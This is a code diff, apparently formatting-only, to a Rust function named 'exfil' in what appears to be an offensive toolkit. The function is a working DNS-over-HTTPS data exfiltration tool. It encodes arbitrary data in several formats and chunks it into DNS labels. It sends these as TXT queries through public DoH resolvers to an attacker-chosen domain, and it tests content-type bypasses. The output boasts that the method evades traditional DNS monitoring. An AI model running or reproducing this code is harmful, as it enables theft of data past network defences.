@@ -39,21 +39,37 @@ pub async fn exfil(domain: &str, data: &str, provider: &str, timeout: u64) -> an
     println!("{} DNS over HTTPS Exfiltration Suite", "[*]".cyan().bold());
     println!("{}", "=".repeat(60).cyan());
     println!("{} Domain: {}", "[*]".cyan().bold(), domain);
-    println!("{} Data: {} ({} bytes)", "[*]".cyan().bold(), data, data.len());
+    println!(
+        "{} Data: {} ({} bytes)",
+        "[*]".cyan().bold(),
+        data,
+        data.len()
+    );
     println!("{} Provider: {}", "[*]".cyan().bold(), provider);
-    println!("{} {} DoH providers, {} content types, {} encodings", "[*]".cyan().bold(), DOH_PROVIDERS.len(), DOH_CONTENT_TYPES.len(), EXFIL_ENCODINGS.len());
+    println!(
+        "{} {} DoH providers, {} content types, {} encodings",
+        "[*]".cyan().bold(),
+        DOH_PROVIDERS.len(),
+        DOH_CONTENT_TYPES.len(),
+        EXFIL_ENCODINGS.len()
+    );
     println!("{}", "-".repeat(60).dimmed());
 
     let client = build_client(timeout);
 
-    let provider_url = DOH_PROVIDERS.iter()
+    let provider_url = DOH_PROVIDERS
+        .iter()
         .find(|(name, _)| name.to_lowercase() == provider.to_lowercase())
         .map(|(_, url)| *url)
         .unwrap_or("https://cloudflare-dns.com/dns-query");
 
-    println!("\n{} [1/4] DoH provider connectivity test...", "[*]".cyan().bold());
+    println!(
+        "\n{} [1/4] DoH provider connectivity test...",
+        "[*]".cyan().bold()
+    );
     for (name, url) in DOH_PROVIDERS {
-        match client.get(*url)
+        match client
+            .get(*url)
             .header("Accept", "application/dns-json")
             .query(&[("name", "example.com"), ("type", "A")])
             .send()
@@ -78,14 +94,24 @@ pub async fn exfil(domain: &str, data: &str, provider: &str, timeout: u64) -> an
         }
     }
 
-    println!("\n{} [2/4] Data encoding for exfiltration...", "[*]".cyan().bold());
-    let encoded: Vec<(String, String)> = EXFIL_ENCODINGS.iter()
+    println!(
+        "\n{} [2/4] Data encoding for exfiltration...",
+        "[*]".cyan().bold()
+    );
+    let encoded: Vec<(String, String)> = EXFIL_ENCODINGS
+        .iter()
         .map(|(name, enc)| {
             let encoded_data = match *enc {
-                "hex" => data.bytes().map(|b| format!("{:02x}", b)).collect::<String>(),
+                "hex" => data
+                    .bytes()
+                    .map(|b| format!("{:02x}", b))
+                    .collect::<String>(),
                 "base32" => base32_encode(data.as_bytes()),
                 "base64" => base64_encode(data.as_bytes()),
-                "url" => data.bytes().map(|b| format!("%{:02X}", b)).collect::<String>(),
+                "url" => data
+                    .bytes()
+                    .map(|b| format!("%{:02X}", b))
+                    .collect::<String>(),
                 _ => data.to_string(),
             };
             (name.to_string(), encoded_data)
@@ -93,20 +119,36 @@ pub async fn exfil(domain: &str, data: &str, provider: &str, timeout: u64) -> an
         .collect();
 
     for (name, enc_data) in &encoded {
-        println!("  {} {:15} {} chars: {}", "*".cyan(), name, enc_data.len(), enc_data.chars().take(60).collect::<String>());
+        println!(
+            "  {} {:15} {} chars: {}",
+            "*".cyan(),
+            name,
+            enc_data.len(),
+            enc_data.chars().take(60).collect::<String>()
+        );
     }
 
-    println!("\n{} [3/4] DNS label exfiltration (chunked)...", "[*]".cyan().bold());
+    println!(
+        "\n{} [3/4] DNS label exfiltration (chunked)...",
+        "[*]".cyan().bold()
+    );
     let chunk_size = 63;
     let mut results = Vec::new();
 
     for (enc_name, enc_data) in &encoded {
-        let chunks: Vec<&str> = enc_data.as_bytes()
+        let chunks: Vec<&str> = enc_data
+            .as_bytes()
             .chunks(chunk_size)
             .map(|c| std::str::from_utf8(c).unwrap_or(""))
             .collect();
 
-        println!("  {} {} — {} chunks of max {} bytes", "*".cyan(), enc_name, chunks.len(), chunk_size);
+        println!(
+            "  {} {} — {} chunks of max {} bytes",
+            "*".cyan(),
+            enc_name,
+            chunks.len(),
+            chunk_size
+        );
 
         for (i, chunk) in chunks.iter().enumerate() {
             let subdomain = if chunks.len() > 1 {
@@ -117,7 +159,8 @@ pub async fn exfil(domain: &str, data: &str, provider: &str, timeout: u64) -> an
 
             let query_url = format!("{}?name={}&type=TXT", provider_url, subdomain);
 
-            match client.get(&query_url)
+            match client
+                .get(&query_url)
                 .header("Accept", "application/dns-json")
                 .send()
                 .await
@@ -135,30 +178,46 @@ pub async fn exfil(domain: &str, data: &str, provider: &str, timeout: u64) -> an
                         format!("status {}", status)
                     };
                     if (i + 1) % 5 == 0 || i == chunks.len() - 1 {
-                        println!("    {} chunk {:02}/{:02} {} len={:02} {}", ".".cyan(), i + 1, chunks.len(), tag, chunk.len(), subdomain.chars().take(50).collect::<String>());
+                        println!(
+                            "    {} chunk {:02}/{:02} {} len={:02} {}",
+                            ".".cyan(),
+                            i + 1,
+                            chunks.len(),
+                            tag,
+                            chunk.len(),
+                            subdomain.chars().take(50).collect::<String>()
+                        );
                     }
                     if has_answer {
                         results.push(format!("{}:chunk{}", enc_name, i));
                     }
                 }
                 Err(_) => {
-                    println!("    {} chunk {:02}/{:02} error", "*".red(), i + 1, chunks.len());
+                    println!(
+                        "    {} chunk {:02}/{:02} error",
+                        "*".red(),
+                        i + 1,
+                        chunks.len()
+                    );
                 }
             }
         }
     }
 
-    println!("\n{} [4/4] Content-type bypass tests...", "[*]".cyan().bold());
+    println!(
+        "\n{} [4/4] Content-type bypass tests...",
+        "[*]".cyan().bold()
+    );
     for ct in DOH_CONTENT_TYPES {
         let query_url = format!("{}?name=test.{}&type=A", provider_url, domain);
-        match client.get(&query_url)
-            .header("Accept", *ct)
-            .send()
-            .await
-        {
+        match client.get(&query_url).header("Accept", *ct).send().await {
             Ok(resp) => {
                 let status = resp.status().as_u16();
-                let tag = if status == 200 { "OK".green().to_string() } else { format!("status {}", status) };
+                let tag = if status == 200 {
+                    "OK".green().to_string()
+                } else {
+                    format!("status {}", status)
+                };
                 println!("  {} {:35} {}", "*".cyan(), ct, tag);
             }
             Err(_) => {
@@ -171,13 +230,22 @@ pub async fn exfil(domain: &str, data: &str, provider: &str, timeout: u64) -> an
         "\n{} {} / {} exfil chunks resolved successfully",
         "[*]".cyan().bold(),
         results.len(),
-        encoded.iter().map(|(_, d)| d.len().div_ceil(chunk_size)).sum::<usize>()
+        encoded
+            .iter()
+            .map(|(_, d)| d.len().div_ceil(chunk_size))
+            .sum::<usize>()
     );
 
     if !results.is_empty() {
-        println!("{} [HIGH] DoH exfiltration successful — data sent via DNS queries!", "[!]".red().bold());
+        println!(
+            "{} [HIGH] DoH exfiltration successful — data sent via DNS queries!",
+            "[!]".red().bold()
+        );
     }
-    println!("{} DoH exfil bypasses traditional DNS monitoring — uses HTTPS to DoH resolver", "[*]".cyan().bold());
+    println!(
+        "{} DoH exfil bypasses traditional DNS monitoring — uses HTTPS to DoH resolver",
+        "[*]".cyan().bold()
+    );
 
     Ok(())
 }
